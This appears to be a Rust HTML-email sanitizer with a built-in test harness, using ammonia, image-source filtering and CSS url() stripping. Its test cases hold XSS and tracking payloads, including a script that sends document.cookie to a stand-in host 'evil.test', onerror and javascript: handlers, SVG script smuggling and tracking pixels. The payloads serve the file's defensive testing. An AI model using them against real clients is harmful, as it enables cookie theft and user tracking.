use std::collections::HashSet;

use anyhow::Result;
use regex::Regex;
use serde_json::json;

const ALLOWED_TAGS: &[&str] = &[
    "a",
    "abbr",
    "b",
    "blockquote",
    "br",
    "caption",
    "center",
    "cite",
    "code",
    "col",
    "colgroup",
    "dd",
    "div",
    "dl",
    "dt",
    "em",
    "font",
    "h1",
    "h2",
    "h3",
    "h4",
    "h5",
    "h6",
    "hr",
    "i",
    "img",
    "li",
    "ol",
    "p",
    "pre",
    "q",
    "s",
    "small",
    "span",
    "strike",
    "strong",
    "sub",
    "sup",
    "table",
    "tbody",
    "td",
    "tfoot",
    "th",
    "thead",
    "tr",
    "u",
    "ul",
];

fn sanitize(input: &str) -> (String, serde_json::Value) {
    let tags: HashSet<&str> = ALLOWED_TAGS.iter().copied().collect();

    let mut builder = ammonia::Builder::default();
    builder
        .tags(tags)
        .rm_tags(&[
            "script", "style", "iframe", "object", "embed", "form", "input", "button",
        ])
        .link_rel(Some("noopener noreferrer"));

    let clean = builder.clean(input).to_string();

    // Second pass: block every image reference that is not an inline
    // attachment (cid:) or a raster data URI. Relative URLs must be blocked
    // too: they resolve against whatever base the renderer uses.
    let img_re = Regex::new(r"(?is)<img\b[^>]*>").expect("img");
    let src_re = Regex::new(r#"(?is)\bsrc\s*=\s*(?:"([^"]*)"|'([^']*)')"#).expect("src");
    let srcset_re = Regex::new(r#"(?is)\s+srcset\s*=\s*(?:"[^"]*"|'[^']*')"#).expect("srcset");
    let mut blocked_images = 0usize;
    let clean = img_re
        .replace_all(&clean, |caps: &regex::Captures| {
            let tag = srcset_re.replace(&caps[0], "").to_string();
            let Some(src) = src_re.captures(&tag) else {
                return tag;
            };
            let url = src
                .get(1)
                .or_else(|| src.get(2))
                .map(|m| m.as_str())
                .unwrap_or("");
            let allowed = url.starts_with("cid:")
                || url.starts_with("data:image/png")
                || url.starts_with("data:image/jpeg")
                || url.starts_with("data:image/gif")
                || url.starts_with("data:image/webp");
            if allowed {
                tag
            } else {
                blocked_images += 1;
                src_re
                    .replace(&tag, r#"src="about:blank" data-blocked-remote="1""#)
                    .to_string()
            }
        })
        .to_string();

    // Third pass: strip CSS that can exfiltrate or reposition over the UI.
    let css_url = Regex::new(r"(?i)url\s*\([^)]*\)").expect("regex");
    let clean = css_url.replace_all(&clean, "none").to_string();

    let lower = clean.to_ascii_lowercase();
    let report = json!({
        "bytes_in": input.len(),
        "bytes_out": clean.len(),
        "blocked_remote_images": blocked_images,
        "checks": {
            "no_script": !lower.contains("<script"),
            "no_iframe": !lower.contains("<iframe"),
            "no_form": !lower.contains("<form"),
            "no_event_handler": !lower.contains("onerror=") && !lower.contains("onload=") && !lower.contains("onclick="),
            "no_js_url": !lower.contains("javascript:"),
            "no_css_url": !lower.contains("url("),
            "external_image": !clean.contains("src=\"http") && !clean.contains("src=\"/") && !clean.contains("src='"),
        }
    });

    (clean, report)
}

const CASES: &[(&str, &str)] = &[
    ("plain", r#"<p>Hello <b>world</b></p>"#),
    (
        "script",
        r#"<p>hi</p><script>fetch('http://evil.test/steal?'+document.cookie)</script>"#,
    ),
    (
        "img-onerror",
        r#"<img src="http://track.test/pixel.gif" onerror="alert(1)">"#,
    ),
    ("js-link", r#"<a href="javascript:alert(1)">click</a>"#),
    (
        "iframe-form",
        r#"<iframe src="http://evil.test"></iframe><form action="http://evil.test"><input name="x"></form>"#,
    ),
    (
        "css-exfil",
        r#"<div style="background:url(http://track.test/bg)">x</div>"#,
    ),
    (
        "svg-smuggling",
        r#"<svg><script>alert(1)</script></svg><p>ok</p>"#,
    ),
    (
        "data-uri-img",
        r#"<img src="data:image/svg+xml;base64,PHN2Zz48c2NyaXB0PmFsZXJ0KDEpPC9zY3JpcHQ+PC9zdmc+">"#,
    ),
    (
        "tracking-table",
        r#"<table><tr><td><img src="https://track.test/open?id=1" width="1" height="1"></td></tr></table>"#,
    ),
];

fn main() -> Result<()> {
    let args: Vec<String> = std::env::args().collect();
    if args.len() == 4 && args[1] == "--sanitize" {
        let input = std::fs::read_to_string(&args[2])?;
        let (clean, report) = sanitize(&input);
        std::fs::write(&args[3], clean)?;
        eprintln!("{}", serde_json::to_string_pretty(&report)?);
        return Ok(());
    }

    let mut results = Vec::new();
    for (id, input) in CASES {
        let (clean, report) = sanitize(input);
        results.push(json!({
            "id": id,
            "clean": clean,
            "report": report,
        }));
    }
    println!("{}", serde_json::to_string_pretty(&results)?);
    Ok(())
}
